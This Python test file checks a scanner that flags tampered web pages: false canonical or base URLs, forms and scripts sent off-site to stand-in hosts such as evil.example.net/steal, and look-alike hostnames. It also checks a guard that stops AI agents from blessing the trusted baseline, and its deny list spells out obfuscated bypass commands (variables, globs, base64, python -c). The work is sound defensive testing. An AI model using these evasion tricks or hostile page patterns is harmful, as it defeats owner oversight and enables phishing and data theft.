"""Curmudgeon's script tests, part 8: batches 2 and 3 of the ultimate audit of 30 Oct 2026 (03 §5.57): the browser
integrity lens, then the stop gates and the change map. Run plugin/tests/run_tests.py, which defines the helpers and
runs every part. Not runnable on its own. Each test here failed on the code before its fix."""

G8 = ["git", "-c", "user.email=t@example.invalid", "-c", "user.name=t"]

def _irows(d, sev=None):
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    return sorted((x["rule"], x["where"]) for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"]
                  if x["area"] == "integrity" and (sev is None or x["sev"] == sev))

SRI8 = 'integrity="sha384-Zm9vYmFyYmF6Zm9vYmFyYmF6Zm9vYmFy"'

@test("audit F-9c12cea5: a page that names a new site as its own (canonical, og:url) can't make that site's form or script count as unchanged against the recorded copy")
def _(d):
    page = '<link rel="canonical" href="https://www.example.com/">\n<form action="/pay"></form>\n<script src="/app.js"></script>\n'
    write(d, "site/index.html", page)
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=d); assert r.returncode == 0, r.stderr
    write(d, "site/index.html", '<link rel="canonical" href="https://evil.example.net/">\n<form action="https://evil.example.net/pay"></form>\n'
                                f'<script src="https://evil.example.net/x.js" {SRI8}></script>\n')
    got = _irows(d, "FAIL")
    assert ("integrity-changed", "site/index.html:2") in got and ("integrity-new-origin", "site/index.html:3") in got, got
    assert ("integrity-changed", "site/index.html:1") in got, ("the page now claims to be another site", got)

@test("audit F-5a56b49c: <base href> to another site is not the page's own site, and relative form, script and link targets resolve against it")
def _(d):
    page = ('<link rel="canonical" href="https://www.example.com/">\n<base href="https://evil.example.net/">\n'
            '<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    write(d, "site/index.html", page)
    got = _irows(d)
    assert ("integrity-form-offsite", "site/index.html:3") in got and ("integrity-script-no-sri", "site/index.html:4") in got, got
    e = d / "e"; write(e, "site/index.html", '<link rel="canonical" href="https://www.example.com/">\n<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=e)
    write(e, "site/index.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="https://evil.example.net/">\n<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    got = _irows(e, "FAIL")
    assert {("integrity-changed", "site/index.html:3"), ("integrity-new-origin", "site/index.html:4"), ("integrity-changed", "site/index.html:5")} <= set(got), got

@test("audit Q04: a recorded copy the owner didn't record or adopt on this machine (shipped, git-tracked, edited) is never compared against, and only the owner can adopt one")
def _(d):
    page = f'<script src="https://cdn.example.net/x.js" {SRI8}></script>\n'
    write(d, "site/index.html", page)
    planted = {"recorded": "2026-10-01", "files": {"site/index.html": {"links": [], "forms": [], "origins": ["example.net"]}}}
    write(d, ".critic/integrity-baseline.json", json.dumps(planted))
    write(d, "site/index.html", page + f'<script src="https://cdn.example.org/y.js" {SRI8}></script>\n')
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    rows = [x for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" and "this machine" in x["what"] for x in rows), rows
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d); assert r.returncode == 0 and "example.net" in r.stdout, r.stdout + r.stderr
    got = _irows(d, "FAIL"); assert ("integrity-new-origin", "site/index.html:2") in got, ("adopted by the owner, it is compared against", got)
    bp = d / ".critic/integrity-baseline.json"; bp.write_text(bp.read_text().replace("example.net", "example.org"))
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    rows = [x for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" for x in rows) and not any(x["rule"] == "integrity-new-origin" for x in rows), ("edited after adoption: not trusted", rows)
    g = d / "g"; write(g, "site/index.html", page); subprocess.run(["git", "init", "-q"], cwd=g)
    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
    subprocess.run(["git", "add", "-f", "."], cwd=g); subprocess.run(G8 + ["commit", "-qm", "ship it"], cwd=g)
    run(S / "critic_scan.py", ".", "--root", ".", cwd=g)
    rows = [x for x in json.loads((g / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" for x in rows), ("git tracks it: it could have come with the code", rows)
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    for cmd in (f"python3 {S}/critic_scan.py . --root . --integrity-adopt", f"python3 {S}/critic_scan.py . --integrity-record"):
        assert rg8.owner_problem(cmd, True), ("an agent can't bless the recorded copy", cmd)

@test("audit F-e55d7809: a Japanese, Chinese or Korean host that mixes its own scripts (Han with Hiragana or Katakana, Han with Hangul) is not a look-alike; Latin with Cyrillic still is")
def _(d):
    page = ('<a href="https://東京ばな奈.jp/">Tokyo</a>\n<a href="https://ソニー銀行.jp/">Bank</a>\n<a href="https://한국大學.kr/">Uni</a>\n'
            '<a href="https://ラーメン.jp/">Ramen</a>\n<a href="https://xn--pypal-4ve.com/">Pay</a>\n')
    write(d, "site/index.html", page)
    got = [x for x in _irows(d) if x[0] == "integrity-lookalike-host"]
    assert got == [("integrity-lookalike-host", "site/index.html:5")], got

@test("batch 2 review: an abbreviated --integrity-adopt or --integrity-record is refused, both by critic_scan.py and by the agents' guard")
def _(d):
    write(d, "site/index.html", "<p>x</p>\n"); write(d, ".critic/integrity-baseline.json", json.dumps({"files": {}}))
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adop", cwd=d)
    assert r.returncode == 2 and "adopted" not in r.stdout, (r.returncode, r.stdout, r.stderr[-200:])
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    for cmd in (f"python3 {S}/critic_scan.py . --integrity-adop", f"python3 {S}/critic_scan.py . --integrity-a", f"python3 {S}/critic_scan.py . --integ"):
        assert rg8.owner_problem(cmd, True), cmd

@test("batch 2 review: the owner's recorded copy is kept out of git, and adopting one git tracks fails and says how to fix it")
def _(d):
    subprocess.run(["git", "init", "-q"], cwd=d); write(d, "site/index.html", "<p>x</p>\n")
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d); run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=d)
    subprocess.run(["git", "add", "-A"], cwd=d)
    tracked = subprocess.run(["git", "ls-files", ".critic"], cwd=d, capture_output=True, text=True).stdout
    assert "integrity-baseline.json" not in tracked, tracked
    subprocess.run(["git", "add", "-f", ".critic/integrity-baseline.json"], cwd=d)
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
    assert r.returncode != 0 and "git rm --cached" in (r.stdout + r.stderr) and "adopted" not in r.stdout, r.stdout + r.stderr

@test("batch 2 review: a Latin name with a lone Hangul letter, Bopomofo or kana is still a look-alike; real CJK names, with or without Latin, are not")
def _(d):
    import scan_integrity as si
    for h in ("xn--paypa-ljv.com", "xn--ggle-bkra.com", "xn--witter-2b5e.com", "paypaノ.com", "gㄅogle.com"):
        assert si.lookalike(h), h
    for h in ("東京ばな奈.jp", "ソニー銀行.jp", "한국大學.kr", "sony銀行.jp", "sonyストア.jp", "lg전자.kr", "ラーメン.jp"):
        assert not si.lookalike(h), h

@test("batch 2 review: <base> rules as a browser reads them: the first base with an href wins, http:host is a host, and an http base makes a relative form insecure")
def _(d):
    import scan_integrity as si
    rows = []
    def emit(sev, rule, area, where, what, ev=""): rows.append((rule, where, what))
    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="http://www.example.com/">\n<form action="/login"></form>\n', emit, d)
    assert ("integrity-form-insecure", "p.html:3") in [(r, w) for r, w, _ in rows], rows
    rows.clear()
    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="/sub/">\n<base href="https://evil.example.net/">\n<form action="/login"></form>\n', emit, d)
    assert not rows, ("the browser uses the first base, which is relative", rows)
    p = si.parse('<base href="http:evil.example.net/">\n<form action="/login"></form>\n')
    assert p.host("/login") == "evil.example.net", p.host("/login")

@test("batch 2 review: --integrity-adopt shows an empty own-site list as none, and (not recorded) only when the list is missing")
def _(d):
    write(d, "site/index.html", "<p>x</p>\n")
    write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": []}, "b.html": {"links": [], "forms": [], "origins": []}}}))
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
    assert "a.html: own none" in r.stdout and "b.html: own (not recorded)" in r.stdout, r.stdout

@test("batch 2 review (reviewers 1 and 3): agents can't call the record helpers directly, a three-slash base is a host, control characters in a copy stop adoption, a same-site base with no canonical raises nothing, and 々 is Japanese")
def _(d):
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    for cmd in ("python3 -c 'from critic_findings import record_baseline; record_baseline(\".\")'", "python3 -c 'import critic_findings as c; c.record_ledger(\".\")'"):
        assert rg8.owner_problem(cmd, True), cmd
    import scan_integrity as si
    p = si.parse('<base href="https:///evil.example.net/">\n<script src="/localhost"></script>\n')
    assert p.host("/localhost") == "evil.example.net", p.host("/localhost")
    rows = []
    def emit(sev, rule, area, where, what, ev=""): rows.append((rule, where))
    si.scan("p.html", '<base href="https://shop.example.com/">\n<script src="/js/site.js"></script>\n', emit, d)
    assert not rows, ("no canonical: a relative script is not judged off-site", rows)
    assert not si.lookalike("佐々木.jp") and not si.lookalike("代々木.jp"), "々 belongs with Han"
    write(d, "site/index.html", "<p>x</p>\n")
    write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": ["\u001b[8m", "example.net", "\u001b[0m"]}}}))
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
    assert r.returncode == 2 and "\u001b" not in r.stdout + r.stderr and "adopted" not in r.stdout, (r.returncode, repr(r.stdout[-200:]), repr(r.stderr[-200:]))

@test("batch 2 review round 2: halfwidth forms are folded as a browser folds them, a lone 々 beside Latin is a look-alike, and every base form reads as a browser reads it")
def _(d):
    import scan_integrity as si
    for h in ("paypaￜ.com", "paypaｴ.com", "exampﾚle.com", "paypa々.com"):
        assert si.lookalike(h), repr(h)
    assert not si.lookalike("ｿﾆｰ銀行.jp") and not si.lookalike("佐々木.jp"), "halfwidth Japanese with Han is still a real name"
    rows = []
    def emit(sev, rule, area, where, what, ev=""): rows.append((rule, where))
    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="http://cdn.example.org/">\n<form action="https:evil.example.net/steal"></form>\n', emit, d)
    assert ("integrity-form-offsite", "p.html:3") in rows, rows
    rows.clear()
    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="http://www.example.com/">\n<form action="//www.example.com/pay"></form>\n', emit, d)
    assert ("integrity-form-insecure", "p.html:3") in rows, rows
    rows.clear()
    si.scan("p.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="">\n<base href="https://cdn.example.net/">\n<form action="/login"></form>\n<script src="/a.js"></script>\n', emit, d)
    assert not rows, ("an empty first base keeps targets on the page's site", rows)

@test("batch 2 review round 2: agents can't adopt or record the trusted copy through the wrapper functions, an alias, a line continuation, a variable or a glob")
def _(d):
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    for cmd in ("python3 -c 'import critic_scan, pathlib; critic_scan.integrity_adopt(pathlib.Path(\".\"))'",
                "python3 -c 'import critic_scan, pathlib; critic_scan.integrity_record(pathlib.Path(\".\"), pathlib.Path(\".\"), [])'",
                "python3 -c 'from critic_findings import record_baseline as r; r(\".\")'",
                f"python3 {S}/critic_scan.py . \\\n --integrity-adopt", f"F=--integrity-adopt; python3 {S}/critic_scan.py . $F",
                f"python3 {S}/crit*scan.py . --integrity-adopt", f"F=grity; python3 {S}/critic_scan.py . --inte$F-adopt"):
        assert rg8.owner_problem(cmd, True), cmd
    assert rg8.owner_problem(f"python3 {S}/critic_scan.py . --root . --page dist/index.html", True) is None, "the detector's own scan still runs"

@test("batch 2 review round 2: adopt refuses newlines, bidi and zero-width controls and malformed fields, and record refuses a copy git tracks")
def _(d):
    write(d, "site/index.html", "<p>x</p>\n")
    for bad in (["evil.example.net" + "\n" * 60 + "fake"], ["x‮ten.elpmaxe"], ["ex​ample.net"], 7):
        write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": bad}}}))
        r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
        assert r.returncode == 2 and "adopted" not in r.stdout and "Traceback" not in r.stderr, (bad, r.returncode, r.stderr[-300:])
    g = d / "g"; write(g, "site/index.html", "<p>x</p>\n"); subprocess.run(["git", "init", "-q"], cwd=g)
    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
    subprocess.run(["git", "add", "-f", ".critic/integrity-baseline.json"], cwd=g)
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
    assert r.returncode == 2 and "git rm --cached" in r.stderr, (r.returncode, r.stdout, r.stderr)

@test("batch 2 review round 3: the guard catches the variable, printf and python -c forms of adopt or record, and no longer refuses pytest --integration, yarn check --integrity or a grep")
def _(d):
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    deny = (f"X=integrity-adopt; python3 {S}/critic_scan.py . --$X", f"a=--in; b=tegrity-adopt; python3 {S}/critic_scan.py . $a$b",
            f"python3 {S}/critic_scan.py . $(printf -- --%s integrity-adopt)", f"python3 {S}/critic_scan.py . --in${{e}}tegrity-adopt",
            "python3 -c 'import critic_scan as c; c.main([\".\", \"-\"*2+\"integrity-adopt\"])'", "python3 -c 'import critic_scan as c; getattr(c, \"integrity_\"+\"adopt\")(\".\")'",
            f"echo LS1pbnRlZ3JpdHktYWRvcHQ= | base64 -d | xargs python3 {S}/critic_scan.py .")
    for cmd in deny: assert rg8.owner_problem(cmd, True), cmd
    allow = ("python3 -m pytest tests --integration", "yarn check --integrity", "grep -rn record_baseline plugin", "grep -n -- --integrity-adopt README.md",
             f"python3 {S}/critic_scan.py src --root . --page dist/index.html")
    for cmd in allow: assert rg8.owner_problem(cmd, True) is None, cmd

@test("batch 2 review round 3: ideographic full stops split labels as a browser splits them, 〇 counts as ideographic, labels from right-to-left pages adopt, and padded hosts don't")
def _(d):
    import scan_integrity as si
    for h in ("例｡paypaｴ.com", "日本。paypaロ.com", "g〇〇gle.com"):
        assert si.lookalike(h), h
    assert not si.lookalike("日本。東京.jp")
    write(d, "site/index.html", '<a href="https://shop.example.net/">חנות&rlm;</a>\n')
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=d); assert r.returncode == 0, r.stderr
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d); assert r.returncode == 0 and "adopted" in r.stdout, r.stderr
    for pad in ([" " * 300 + "none"], ["evil-cdn.net", " " * 300], ["x" * 300 + ".net"]):
        write(d, ".critic/integrity-baseline.json", json.dumps({"files": {"a.html": {"own": [], "links": [], "forms": [], "origins": pad}}}))
        r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d)
        assert r.returncode == 2 and "adopted" not in r.stdout, (pad[0][:20], r.stdout[-200:])
